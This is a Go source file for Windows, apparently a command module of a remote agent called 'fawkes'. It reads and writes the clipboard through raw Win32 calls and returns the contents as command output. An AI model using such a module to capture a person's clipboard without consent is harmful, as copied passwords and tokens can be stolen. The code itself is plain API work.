//go:build windows
// +build windows

package commands

import (
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	user32CB              = windows.NewLazySystemDLL("user32.dll")
	kernel32CB            = windows.NewLazySystemDLL("kernel32.dll")
	procOpenClipboard     = user32CB.NewProc("OpenClipboard")
	procCloseClipboard    = user32CB.NewProc("CloseClipboard")
	procGetClipboardData  = user32CB.NewProc("GetClipboardData")
	procSetClipboardData  = user32CB.NewProc("SetClipboardData")
	procEmptyClipboard    = user32CB.NewProc("EmptyClipboard")
	procGlobalAlloc       = kernel32CB.NewProc("GlobalAlloc")
	procGlobalFree        = kernel32CB.NewProc("GlobalFree")
	procGlobalLock        = kernel32CB.NewProc("GlobalLock")
	procGlobalUnlock      = kernel32CB.NewProc("GlobalUnlock")
)

const (
	cfUnicodeText = 13
	gmemMoveable  = 0x0002
)

func readClipboard() structs.CommandResult {
	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseClipboard.Call()

	handle, _, _ := procGetClipboardData.Call(cfUnicodeText)
	if handle == 0 {
		return structs.CommandResult{
			Output:    "Clipboard is empty or does not contain text",
			Status:    "success",
			Completed: true,
		}
	}

	ptr, _, err := procGlobalLock.Call(handle)
	if ptr == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to lock clipboard memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procGlobalUnlock.Call(handle)

	text := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))

	if text == "" {
		return structs.CommandResult{
			Output:    "Clipboard is empty",
			Status:    "success",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Clipboard contents (%d chars):\n%s", len(text), text),
		Status:    "success",
		Completed: true,
	}
}

func writeClipboard(text string) structs.CommandResult {
	utf16Text, err := syscall.UTF16FromString(text)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to encode text: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	size := len(utf16Text) * 2

	hMem, _, err := procGlobalAlloc.Call(gmemMoveable, uintptr(size))
	if hMem == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to allocate memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	ptr, _, err := procGlobalLock.Call(hMem)
	if ptr == 0 {
		procGlobalFree.Call(hMem)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to lock memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	src := unsafe.Pointer(&utf16Text[0])
	dst := unsafe.Pointer(ptr)
	copy(
		unsafe.Slice((*byte)(dst), size),
		unsafe.Slice((*byte)(src), size),
	)

	procGlobalUnlock.Call(hMem)

	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		procGlobalFree.Call(hMem)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseClipboard.Call()

	procEmptyClipboard.Call()

	// On success, system takes ownership of hMem. On failure, we must free.
	ret, _, err = procSetClipboardData.Call(cfUnicodeText, hMem)
	if ret == 0 {
		procGlobalFree.Call(hMem)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to set clipboard data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully wrote %d characters to clipboard", len(text)),
		Status:    "success",
		Completed: true,
	}
}

func clipReadText() string {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer procCloseClipboard.Call()

	handle, _, _ := procGetClipboardData.Call(cfUnicodeText)
	if handle == 0 {
		return ""
	}

	ptr, _, _ := procGlobalLock.Call(handle)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlock.Call(handle)

	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
}
